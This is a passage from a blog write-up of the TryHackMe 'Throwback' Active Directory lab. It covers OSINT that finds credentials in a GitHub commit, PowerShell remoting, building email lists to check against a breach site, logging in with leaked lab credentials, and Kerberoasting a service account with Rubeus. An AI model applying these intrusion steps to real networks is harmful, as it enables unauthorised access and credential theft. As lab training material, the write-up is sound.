</pre></table></code></div></div><p><strong>breachgtfo.corporate.local</strong></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/site1.png" alt="site1" /></p><p><strong>mail.corporate.local</strong></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/site2.png" alt="site2" /></p><p>Now, we tried all our emails and non worked. So we need to look for other email to test in data leaks. First, I will use the sites that recommended for finding users and projects <code class="language-plaintext highlighter-rouge">linkedin and GitHub</code>.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/social_1.png" alt="social_1" /></p><p>After trying all users we found, there is a user who have a good note.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/social_2.png" alt="social_2" /></p><p>Rikka Foxx told us that he is the developer. So let’s check his gitub account.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/social_2_5.png" alt="social_2_5" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/social_3.png" alt="social_3" /></p><p>After opening the ThrowBack project. There’s a 9-commits. let’s get them.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/social_4.png" alt="social_4" /></p><p>There’s a interesting update in <code class="language-plaintext highlighter-rouge">db_connect.php</code>.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/social_5.png" alt="social_5" /></p><p>There’s a credentials. <code class="language-plaintext highlighter-rouge">DaviesJ:Management2018</code></p><p>Let’s use Powershell to get a shell here. The xfreerdp window that we have for <code class="language-plaintext highlighter-rouge">proxychains xfreerdp /u:mercerh /p:pikapikachu7 /cert:ignore /v:10.200.154.118</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Enter-PSSession -ComputerName corp-adt01.corporate.local  -Credential corporate\DaviesJ
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/emai__2.png" alt="emai__2" /></p><p>It will popup a window to enter the password <code class="language-plaintext highlighter-rouge">Management2018</code></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/popup.png" alt="popup" /></p><p>Let’s check our privileges.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/atd_2.png" alt="atd_2" /></p><h3 id="13-tbsec-dc01-1020015479">13. <strong>TBSEC-DC01 10.200.154.79</strong></h3><h4 id="131-tbsec-dc01-as-tbsec_guest">13.1 TBSEC-DC01 As TBSEC_GUEST</h4><p>There’s a file called <code class="language-plaintext highlighter-rouge">email_update.txt</code> in <code class="language-plaintext highlighter-rouge">Dosierk\Document</code>. Let’s check it.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/email__3.png" alt="email__3" /></p><p>We will use the given mail formate for all users. Let’s get the user list with <a href="https://github.com/Sq00ky/LeetLinked">LeetLinked</a>.</p><p><code class="language-plaintext highlighter-rouge">python3 leetlinked.py -e "throwback.local" -f 1 "Throwback Hacks"</code></p><p>When we run this the output will give us 4 emails.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/last_email.png" alt="last_email" /></p><p>Now let’s convert them to the formate.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sed -i 's/throwback.local/TBHSecurity.com/g' last_emails
</pre></table></code></div></div><p>Try the next command with every department</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sed -n '/@/{s|^|ESM-|};p' last_emails
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/sort_u.png" alt="sort_u" /></p><p>After some trying. There’s a user with leaked credentials.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/breach_1.png" alt="breach_1" /></p><p>Now, Let’s login with it’s credentials.</p><p><code class="language-plaintext highlighter-rouge">JStewart:aqAwM53cW8AgRbfr</code></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/breach_2.png" alt="breach_2" /></p><p>There’s a credentials.</p><p><code class="language-plaintext highlighter-rouge">TBSEC_GUEST:WelcomeTBSEC1!</code></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/tbsec-dc01-1.png" alt="tbsec-dc01-" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/tbsec-dc01-2.png" alt="tbsec-dc01-2" /></p><h4 id="132-tbsec-dc01-as-tbsec_guest">13.2 TBSEC-DC01 As TBSEC_GUEST</h4><p>After some enumeration. I found that there’s a user with an admin access called <code class="language-plaintext highlighter-rouge">TBService</code>. From the name that’s a service user. After get it’s SPN, I decided to Kerberoasing it.</p><p>We did before with <code class="language-plaintext highlighter-rouge">Impacket</code>. So let’s do it in another way with <a href="https://github.com/GhostPack/Rubeus">Rubeus</a>. I got the shell to C2 <code class="language-plaintext highlighter-rouge">you can do it form shell.</code></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/kerberoasting_rebu.png" alt="kerberoasting_rebu" /></p><p>The result is:</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/kerberoasting_rebu2.png" alt="kerberoasting_rebu2" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/kerberoasting_rebu3.png" alt="kerberoasting_rebu3" /></p><p>Let’s crack the hash.</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback//last_hash1.png" alt="last_hash1" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/last_hash2.png" alt="last_hash2" /></p><p>LOGIN:</p><p>runas /tbservice “cmd.exe”</p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/login_1.png" alt="login_1" /></p><p><img data-proofer-ignore data-src="/assets/img/tryhackme/throwback/final_zzz.png" alt="final_zzz" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeup/'>WriteUp</a>, <a href='/categories/tryhackme/'>TryHackMe</a>, <a href='/categories/activedirectory/'>ActiveDirectory</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/enumeration/" class="post-tag no-text-decoration" >Enumeration</a> <a href="/tags/c2/" class="post-tag no-text-decoration" >C2</a> <a href="/tags/powershell/" class="post-tag no-text-decoration" >Powershell</a> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >Kerberos</a> <a href="/tags/pivot/" class="post-tag no-text-decoration" >pivot</a> <a href="/tags/macros/" class="post-tag no-text-decoration" >Macros</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TryHackMe: ThrowBack Network Penetration Test Report - 0xkaram&url=https://0xkaram.github.io/posts/Try-Hack-Me-Throwback-Write-Up/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TryHackMe: ThrowBack Network Penetration Test Report - 0xkaram&u=https://0xkaram.github.io/posts/Try-Hack-Me-Throwback-Write-Up/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://0xkaram.github.io/posts/Try-Hack-Me-Throwback-Write-Up/&text=TryHackMe: ThrowBack Network Penetration Test Report - 0xkaram" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recently Posted</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"></ul><li><a href="/posts/Cross-Site-Scripting-XSS/">Web Security Academy: Cross Site Scripting XSS</a></ul><li><a href="/posts/Try-Hack-Me-Throwback-Write-Up/">TryHackMe: ThrowBack Network Penetration Test Report</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/angularjs/">AngularJS</a> <a class="post-tag" href="/tags/c2/">C2</a> <a class="post-tag" href="/tags/csp/">CSP</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a> <a class="post-tag" href="/tags/exploiting/">Exploiting</a> <a class="post-tag" href="/tags/javascript/">JavaScript</a> <a class="post-tag" href="/tags/jquery/">jquery</a> <a class="post-tag" href="/tags/kerberos/">Kerberos</a> <a class="post-tag" href="/tags/macros/">Macros</a> <a class="post-tag" href="/tags/pivot/">pivot</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Cross-Site-Scripting-XSS/"><div class="card-body"> <span class="timeago small" >2021-04-01 00:00:00 +0200<i class="unloaded">01 April 2021</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Web Security Academy: Cross Site Scripting XSS</h3><div class="text-muted small"><p> Disclamir All solved labs can be found here at Web Security Academy https://portswigger.net/web-security/all-labs 0. Index 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/posts/Cross-Site-Scripting-XSS/" class="btn btn-outline-primary" prompt="Newer"><p>Web Security Academy: Cross Site Scripting XSS</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/0xkaram">Mohamed Zakzouk</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/angularjs/">AngularJS</a> <a class="post-tag" href="/tags/c2/">C2</a> <a class="post-tag" href="/tags/csp/">CSP</a> <a class="post-tag" href="/tags/enumeration/">Enumeration</a> <a class="post-tag" href="/tags/exploiting/">Exploiting</a> <a class="post-tag" href="/tags/javascript/">JavaScript</a> <a class="post-tag" href="/tags/jquery/">jquery</a> <a class="post-tag" href="/tags/kerberos/">Kerberos</a> <a class="post-tag" href="/tags/macros/">Macros</a> <a class="post-tag" href="/tags/pivot/">pivot</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-3RH8L4C3R4"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-3RH8L4C3R4'); }); </script>
